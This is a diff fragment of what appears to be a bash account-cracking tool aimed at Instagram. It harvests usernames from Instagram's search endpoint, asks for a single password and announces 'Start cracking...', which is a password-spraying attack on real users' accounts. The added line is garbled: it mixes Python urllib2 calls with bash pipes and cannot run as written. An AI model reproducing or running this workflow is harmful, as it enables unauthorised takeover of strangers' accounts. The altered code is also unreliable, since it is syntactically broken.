@@ -48,7 +48,7 @@ touch target
 case $opt in
     1) #menu 1
         read -p $'\e[37m[\e[34m?\e[37m] Search by query   : \e[1;33m' ask
-        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
+        data = urllib2.urlopen(urllib2.Request(url="https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
         echo $'\e[37m[\e[34m+\e[37m] Just found        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
         read -p $'[\e[1;34m?\e[1;37m] Password to use   : \e[1;33m' pass
         echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
